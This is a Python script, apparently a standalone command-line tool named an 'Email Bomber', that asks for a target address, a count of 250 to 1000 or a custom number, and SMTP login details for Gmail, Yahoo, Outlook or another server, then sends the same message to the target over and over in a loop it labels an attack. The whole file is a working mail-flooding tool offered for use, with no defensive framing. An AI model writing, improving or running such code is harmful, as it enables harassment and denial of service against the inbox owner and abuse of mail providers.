
import smtplib
import sys

class bcolor:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'

def banner():
    flag = """
      =======================================================================================================
      *       ********     ******     **       **   **         **     ******    **           '``'           *
      *          **       **    **     **     **    ** **      **   **     **   **          '- framet'?''   *
      *          **       **    **      **   **     **  **     **   **     **   **            ''    ''      *
      *          **       **    **       ** **      **    **   **   *********   **                          *
      *          **       **    **        ***       **     **  **   **     **   **                          *
      *     **   **       **    **         **       **      *****   **     **   **       **                 *
      *      *****         ******          **       **        ***   **     **   ***********                 *
      =======================================================================================================
        """
    print(flag)

class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolor.RED + '\n*********** Initializing program *************')
            self.target = str(input(bcolor.GREEN + 'Enter target email: '))
            self.mode =int(input(bcolor.GREEN + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom):'))
            if int(self.mode) > int(4) or (self.mode) < int(1):
                print ('Error: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print (f'Error: {e}')

    def bomb(self):
        try:
            print (bcolor.RED + '\n*********** Setting up bomb ***********')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolor.GREEN + 'Choose a CUSTOM amount: '))
            print(bcolor.RED + f'\n************ You have selected BOMB mode: {self.mode} and {self.amount} emails ********')
        except Exception as e:
            print (f'Error: {e}')

    def email(self):
        try:
            print(bcolor.RED + '************** Setting up email ************')
            self.server = str(input(bcolor.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook : '))
            premade = ['1','2','3']
            default_port = True
            if self.server not in premade :   # Email server is custom
                default_port = False
                self.port = int(input(bcolor.GREEN + 'Enter port number: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':  # Gmail
                self.server = 'smtp.gmail.com'
            elif self.server == '2': # Yahoo
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3': # Outlook
                self.server = 'smtp-mail.outlook.com'

            self.fromAddress = str(input(bcolor.GREEN + 'Enter from address: '))
            self.fromPassword = str(input(bcolor.GREEN + 'Enter from password: '))
            self.subject = str(input(bcolor.GREEN + 'Enter subject: '))
            self.message = str(input(bcolor.GREEN + 'Enter message: '))

            self.msg = ''' From: %s\nTo: %s\nSubject: %s\n %s\n
                       ''' % (self.fromAddress, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server,self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddress, self.fromPassword)

        except Exception as e:
                print (f'Error: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddress, self.target, self.message)
            self.count +=1
            print (bcolor.YELLOW + f'BOMB : {self.count}')
        except Exception as e:
            print(f'Error: {e}')

    def attack(self):
        print(bcolor.RED + '\n************** Attacking... ************')
        for email in range(self.amount + 1):
            self.send()
        self.s.close
        print(bcolor.RED + '\n************* Attack finished ***********')
        sys.exit(0)


if __name__ == "__main__":
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
